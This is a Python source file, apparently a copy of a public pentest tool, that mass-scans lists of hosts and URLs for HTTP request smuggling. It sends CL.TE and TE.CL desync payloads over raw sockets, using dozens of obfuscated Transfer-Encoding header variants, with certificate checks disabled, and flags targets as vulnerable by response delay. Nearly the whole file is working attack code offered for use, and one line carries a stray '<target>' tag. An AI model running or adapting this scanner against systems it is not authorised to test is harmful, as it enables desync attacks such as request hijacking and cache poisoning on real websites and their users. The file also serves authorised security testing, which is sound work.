#!/usr/bin/python3.5
# This is copied from https://raw.githubusercontent.com/gwen001/pentest-tools/master/smuggler.py
# I don't believe in license.
# You can do whatever you want with this program.

# Based on the awesome James Kettle research
# https://twitter.com/albinowax
# https://portswigger.net/web-security/request-smuggling
# https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

import os
import sys
import ssl
import time
import random
import argparse
import socket
import requests
from urllib.parse import urlparse
from threading import Thread
from queue import Queue
from colored import fg, bg, attr

MAX_EXCEPTION = 10
MAX_VULNERABLE = 5

# disable "InsecureRequestWarning: Unverified HTTPS request is being made."
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


CRLF = '\r\n'

t_base_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/60.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close',
    'Content-Length': '0',
}

t_colors = {
    'ref': 'cyan',
    'attack': 'white',
    'vulnerable': 'light_red',
}

t_attacks_datas = [
    {'name':'CL:TE1', 'Content-Length':5, 'body':'1\r\nZ\r\nQ\r\n\r\n'},
    {'name':'CL:TE2', 'Content-Length':11, 'body':'1\r\nZ\r\nQ\r\n\r\n'},
    {'name':'TE:CL1', 'Content-Length':5, 'body':'0\r\n\r\n'},
    {'name':'TE:CL2', 'Content-Length':6, 'body':'0\r\n\r\nX'},
]

t_registered_method = [
    # 'tabprefix1',
    # 'vertprefix1',

    # 'vanilla',
    'dualchunk',
    'badwrap',
    'space1',
    'badsetupLF',
    'gareth1',

    # niche techniques
    # 'underjoin1',
    'spacejoin1',
    #'underscore2',
    # 'space2',
    'nameprefix1',
    'valueprefix1',
    'nospace1',
    'commaCow',
    'cowComma',
    'contentEnc',
    'linewrapped1',
    'quoted',
    'aposed',
    'badsetupCR',
    'vertwrap',
    'tabwrap',

    # new techniques for AppSec
    'lazygrep',
    'multiCase',
    'zdwrap',
    'zdspam',
    'revdualchunk',
    'nested',
    # 'bodysplit',
    # 'zdsuffix',
    # 'tabsuffix',
    # 'UPPERCASE',
    # 'reversevanilla',
    # 'spaceFF',
    # 'accentTE',
    # 'accentCH',
    # 'unispace',
    # 'connection',

    'spacefix1_0',
    'spacefix1_9',
    'spacefix1_11',
    'spacefix1_12',
    'spacefix1_13',
    'spacefix1_127',
    'spacefix1_160',
    'spacefix1_255',

    'prefix1_0',
    'prefix1_9',
    'prefix1_11',
    'prefix1_12',
    'prefix1_13',
    'prefix1_127',
    'prefix1_160',
    'prefix1_255',

    'suffix1_0',
    'suffix1_9',
    'suffix1_11',
    'suffix1_12',
    'suffix1_13',
    'suffix1_127',
    'suffix1_160',
    'suffix1_255',
]
# t_registered_method = [
#     'contentEnc',
# ]

class attackMethod:
    def update_content_length( self, msg, cl ):
        return msg.replace( 'Content-Length: 0', 'Content-Length: '+str(cl) )

    def underjoin1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding', 'Transfer_Encoding' )
        return msg
    
    def underscore2( self, msg ):
        msg = msg.replace( 'Content-Length', 'Content_Length' )
        return msg

    def spacejoin1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding', 'Transfer Encoding' )
        return msg
    
    def space1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding', 'Transfer-Encoding ' )
        return msg
    
    def space2( self, msg ):
        msg = msg.replace( 'Content-Length', 'Content-Length ' )
        return msg

    def nameprefix1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding', ' Transfer-Encoding' )
        return msg

    def valueprefix1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:  ' )
        return msg

    def nospace1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:' )
        return msg

    def tabprefix1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:\t' )
        return msg

    def vertprefix1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:\u000B' )
        return msg

    def commaCow( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked, cow' )
        return msg

    def cowComma( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: cow, ' )
        return msg

    def contentEnc( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Content-Encoding: ' )
        return msg

    def linewrapped1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:\n' )
        return msg

    def gareth1( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding\n : ' )
        return msg

    def quoted( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: "chunked"' )
        return msg

    def aposed( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', "Transfer-Encoding: 'chunked'" )
        return msg

    def badwrap( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\n Transfer-Encoding: chunked\r\n' )
        return msg

    def badsetupCR( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\nFooz: bar\rTransfer-Encoding: chunked\r\n' )
        return msg

    def badsetupLF( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\nFooz: bar\nTransfer-Encoding: chunked\r\n' )
        return msg

    def vertwrap( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: \n\u000B' )
        return msg

    def tabwrap( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: \n\t' )
        return msg

    def dualchunk( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked\r\nTransfer-Encoding: cow' )
        return msg

    def lazygrep( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunk' )
        return msg

    def multiCase( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'TrAnSFer-EnCODinG: cHuNkeD' )
        return msg

    def UPPERCASE( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'TRANSFER-ENCODING: CHUNKED' )
        return msg

    def zdwrap( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: bar' )
        msg = msg.replace( 'HTTP/1.1\r\n', 'HTTP/1.1\r\nFoo: bar\r\n\rTransfer-Encoding: chunked\r\n' )
        return msg

    def zdsuffix( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked\r' )
        return msg

    def zdsuffix( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked\t' )
        return msg

    def revdualchunk( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: cow\r\nTransfer-Encoding: chunked' )
        return msg

    def zdspam( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer\r-Encoding: chunked' )
        return msg

    def bodysplit( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Foo: barn\n\nTransfer-Encoding: chunked' )
        return msg

    def connection( self, msg ):
        msg = msg.replace( 'Connection', 'Transfer-Encoding' )
        return msg

    def nested( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: cow chunked bar' )
        return msg

    def spaceFF( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(255) )
        return msg

    def unispace( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(160) )
        return msg

    def accentTE( self, msg ):
        msg = msg.replace( 'Transfer-Encoding:', 'Transf'+chr(130)+'r-Encoding:' )
        return msg

    def accentCH( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfr-Encoding: ch'+chr(150)+'nked' )
        return msg

    def vanilla( self, msg ):
        # ???
        return msg

    def reversevanilla( self, msg ):
        # ???
        return msg

    def spacefix1_0( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(0) )
        return msg
    def spacefix1_9( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(9) )
        return msg
    def spacefix1_11( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(11) )
        return msg
    def spacefix1_12( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(12) )
        return msg
    def spacefix1_13( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(13) )
        return msg
    def spacefix1_127( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(127) )
        return msg
    def spacefix1_160( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(160) )
        return msg
    def spacefix1_255( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding:'+chr(255) )
        return msg

    def prefix1_0( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(0) )
        return msg
    def prefix1_9( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(9) )
        return msg
    def prefix1_11( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(11) )
        return msg
    def prefix1_12( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(12) )
        return msg
    def prefix1_13( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(13) )
        return msg
    def prefix1_127( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(127) )
        return msg
    def prefix1_160( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(160) )
        return msg
    def prefix1_255( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: ', 'Transfer-Encoding: '+chr(255) )
        return msg

    def suffix1_0( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(0) )
        return msg
    def suffix1_9( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(9) )
        return msg
    def suffix1_11( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(11) )
        return msg
    def suffix1_12( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(12) )
        return msg
    def suffix1_13( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(13) )
        return msg
    def suffix1_127( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(127) )
        return msg
    def suffix1_160( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(160) )
        return msg
    def suffix1_255( self, msg ):
        msg = msg.replace( 'Transfer-Encoding: chunked', 'Transfer-Encoding: chunked'+chr(255) )
        return msg


class sockRequest:
    url = ''
    message = ''
    response = ''
    length = 0
    time = 0
    headers = ''
    headers_length = 0
    t_headers = {}
    status_code = -1
    status_reason = ''
    content = ''
    content_length = 0


    def __init__( self, url, message ):
        self.url = url
        self.message = message
    

    def receive_all( self, sock ):
        datas = ''

        for i in range(100):
            chunk = sock.recv( 4096 )
            if chunk:
                datas = datas + chunk.decode(errors='ignore')
                break # yes yes I know...
                # but we don't really care about the content, it's mostly about the delay so...
            else:
                break

        return datas


    def extractDatas( self ):
        self.length = len( self.response )
        p = self.response.find( CRLF+CRLF )
        self.headers = self.response[0:p]
        self.headers_length = len( self.headers )
        self.content = self.response[p+len(CRLF+CRLF):]
        self.content_length = len( self.content )

        tmp = self.headers.split( CRLF )
        
        first_line = tmp[0].split( ' ' )
        self.status_code = int(first_line[1])
        self.status_reason = first_line[2]

        for header in tmp:
            p = header.find( ': ' )
            k = header[0:p]
            v = header[p+2:]
            self.t_headers[ k ] = v
    

    def send( self ):
        t_urlparse = urlparse( self.url )
        
        if t_urlparse.port:
            port = t_urlparse.port
        elif t_urlparse.scheme == 'https':
            port = 443
        else:
            port = 80
        
        # print( t_urlparse )
        # print( self.url )
        # print( port )
        # print( '>>>'+self.message+'<<<' )

        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )

        if t_urlparse.scheme == 'https':
<target>
            context = ssl.SSLContext( ssl.PROTOCOL_SSLv23 )
</target>
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket( sock, server_hostname=t_urlparse.netloc )

        sock.settimeout( _timeout )

        try:
            sock.connect( (t_urlparse.netloc, port) )
        except Exception as e:
            sys.stdout.write( "%s[-] error occurred: %s (%s)%s\n" % (fg('red'),e,url,attr(0)) )
            return False
        
        sock.sendall( str.encode(self.message) )
        start = time.time()

        try:
            datas = self.receive_all( sock )
        except Exception as e:
            sys.stdout.write( "%s[-] error occurred: %s (%s)%s\n" % (fg('red'),e,url,attr(0)) )
            return False
        
        end = time.time()
        sock.shutdown( socket.SHUT_RDWR )
        sock.close()

        self.response = datas
        self.time = (end - start) * 1000

        if len(datas):
            self.extractDatas()


def generateAttackMessage( base_message, method, attack_datas ):
    try:
        f = getattr( am, method )
    except Exception as e:
        return ''

    msg = base_message.strip() + CRLF
    msg = am.update_content_length( msg, attack_datas['Content-Length'] )
    msg = msg + 'Transfer-Encoding: chunked' + CRLF
    msg = f( msg )
    msg = msg + CRLF + attack_datas['body']

    return msg


def generateBaseMessage( url, t_evil_headers ):
    t_urlparse = urlparse( url )
    # print( t_urlparse )

    if t_urlparse.path:
        query = t_urlparse.path
    else:
        query = '/'
    if t_urlparse.query:
        query = query + '?' + t_urlparse.query
    if t_urlparse.fragment:
        query = query + '#' + t_urlparse.fragment

    msg = 'POST ' + query + ' HTTP/1.1' + CRLF
    msg = msg + 'Host: ' + t_urlparse.netloc + CRLF

    for k,v in t_evil_headers.items():
        msg = msg + k + ': ' + v + CRLF
    msg = msg + CRLF

    return msg


def testURL( url ):
    time.sleep( 0.01 )

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        t_multiproc['n_current'] = t_multiproc['n_current'] + 1
        # sys.stdout.write( '\n' )

    if not url in t_exceptions:
        t_exceptions[url] = 0

    if not url in t_vulnerable:
        t_vulnerable[url] = 0

    if url in t_history:
        return False
    t_history.append( url )

    base_message = generateBaseMessage( url, t_base_headers )

    # reference request (we don't care)
    # r = doRequest( url, base_message )
    # if r.status_code < 0:
    #     t_exceptions[url] = t_exceptions[url] + 1
    # else:
    #     printResult( r, 'ref', '', '' )

    for method in t_methods:
        for attack_datas in t_attacks_datas:
            if t_exceptions[url] >= MAX_EXCEPTION:
                if _verbose >= 2:
                    print("skip too many exceptions %s" % url)
                return False
            if t_vulnerable[url] >= MAX_VULNERABLE:
                if _verbose >= 2:
                    print("skip already vulnerable %s" % url)
                return False

            msg = generateAttackMessage( base_message, method, attack_datas )
            # print( msg )
            if not msg:
                sys.stdout.write( '%smethod not implemented yet: %s%s\n' %  (fg('red'),method,attr(0)) )
                break

            r = doRequest( url, msg )
            if r.status_code < 0:
                t_exceptions[url] = t_exceptions[url] + 1
            else:
                if r.time > 5000:
                # if r.status_code == 500 and r.time > 5000:
                    color = 'vulnerable'
                    t_vulnerable[url] = t_vulnerable[url] + 1
                else:
                    color = 'attack'
                printResult( r, color, method, attack_datas )


def doRequest( url, message ):
    r = sockRequest( url, message )
    r.send()
    return r


def printResult( r, r_type, method, attack_datas ):
    if 'Content-Type' in r.t_headers:
        content_type = r.t_headers['Content-Type']
    else:
        content_type = '-'

    payload = method
    if attack_datas:
        payload = attack_datas['name'] + '|' + payload

    if r_type == 'vulnerable':
        vuln = 'VULNERABLE'
    else:
        vuln = '-'

    output = '%s\t\tM=%s\t\tC=%d\t\tL=%d\t\ttime=%d\t\tT=%s\t\tV=%s\n' %  (r.url.ljust(u_max_length),payload,r.status_code,r.length,r.time,content_type,vuln)
    if _verbose >= 2 or ( _verbose>=1 and r_type=='vulnerable' ):
        sys.stdout.write( '%s%s%s' % (fg(t_colors[r_type]),output,attr(0)) )

    fp = open( t_multiproc['f_output'], 'a+' )
    if r_type=='vulnerable':
        output = output + '>>>'+r.message+'<<<\n'
    fp.write( output )
    fp.close()

    if _verbose >= 3 or (_verbose >= 2 and r_type=='vulnerable'):
        sys.stdout.write( '%s>>>%s<<<%s\n' % (fg('dark_gray'),r.message,attr(0)) )
    if _verbose >= 4:
        sys.stdout.write( '%s>>>%s<<<%s\n' % (fg('dark_gray'),r.response,attr(0)) )


parser = argparse.ArgumentParser()
parser.add_argument( "-d","--header",help="custom headers", action="append" )
parser.add_argument( "-a","--path",help="set paths list" )
parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
parser.add_argument( "-s","--scheme",help="scheme to use, default: http,https" )
parser.add_argument( "-t","--threads",help="threads, default 10" )
parser.add_argument( "-m","--method",help="set methods separated by comma, default: all" )
parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
parser.add_argument( "-i","--timeout",help="set timeout, default 10" )
parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=requests+headers, 4=full debug, default: 1" )
parser.parse_args()
args = parser.parse_args()

if args.scheme:
    t_scheme = args.scheme.split(',')
else:
    t_scheme = ['http','https']

if args.timeout:
    _timeout = int(args.timeout)
else:
    _timeout = 30

if args.method:
    t_methods = args.method.split(',')
else:
    t_methods = t_registered_method

t_custom_headers = {}
if args.header:
    for header in args.header:
        if ':' in header:
            tmp = header.split(':')
            t_custom_headers[ tmp[0].strip() ] = tmp[1].strip()

t_hosts = []
if args.hosts:
    if os.path.isfile(args.hosts):
        fp = open( args.hosts, 'r' )
        t_hosts = fp.read().strip().split("\n")
        fp.close()
    else:
        t_hosts.append( args.hosts )
n_hosts = len(t_hosts)
sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )

t_urls = []
if args.urls:
    if os.path.isfile(args.urls):
        fp = open( args.urls, 'r' )
        t_urls = fp.read().strip().split("\n")
        fp.close()
    else:
        t_urls.append( args.urls )
n_urls = len(t_urls)
sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )

if n_hosts == 0 and n_urls == 0:
    parser.error( 'hosts/urls list missing' )

t_path = [ '' ]
if args.path:
    if os.path.isfile(args.path):
        fp = open( args.path, 'r' )
        t_path = fp.read().strip().split("\n")
        fp.close()
    else:
        t_path.append( args.path )
n_path = len(t_path)
sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )

if args.verbose:
    _verbose = int(args.verbose)
else:
    _verbose = 2

if args.threads:
    _threads = int(args.threads)
else:
    _threads = 10

t_totest = []
t_totest2 = []
t_history = []
u_max_length = 0
d_output =  os.getcwd()+'/smuggler'
f_output = d_output + '/' + 'output'
if not os.path.isdir(d_output):
    try:
        os.makedirs( d_output )
    except Exception as e:
        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        exit()

sys.stdout.write( '%s[+] options are -> threads:%d, verbose:%d%s\n' % (fg('green'),_threads,_verbose,attr(0)) )


for scheme in t_scheme:
    for host in t_hosts:
        for path in t_path:
            u = scheme + '://' + host.strip() + path
            t_totest.append( u )
            l = len(u)
            if l > u_max_length:
                u_max_length = l

for url in t_urls:
    for path in t_path:
        u = url.strip() + path
        t_totest.append( u )
        l = len(u)
        if l > u_max_length:
            u_max_length = l

am = attackMethod()
n_totest = len(t_totest)
sys.stdout.write( '%s[+] %d urls to test.%s\n' % (fg('green'),n_totest,attr(0)) )
sys.stdout.write( '[+] testing...\n' )


random.shuffle(t_totest)
# print("\n".join(t_totest))
# exit()

t_exceptions = {}
t_vulnerable = {}
t_multiproc = {
    'n_current': 0,
    'n_total': n_totest,
    'd_output': d_output,
    'f_output': f_output,
    '_verbose': _verbose,
}

def doWork():
    while True:
        url = q.get()
        testURL( url )
        q.task_done()

q = Queue( _threads*2 )

for i in range(_threads):
    t = Thread( target=doWork )
    t.daemon = True
    t.start()

try:
    for url in t_totest:
        q.put( url )
    q.join()
except KeyboardInterrupt:
    sys.exit(1)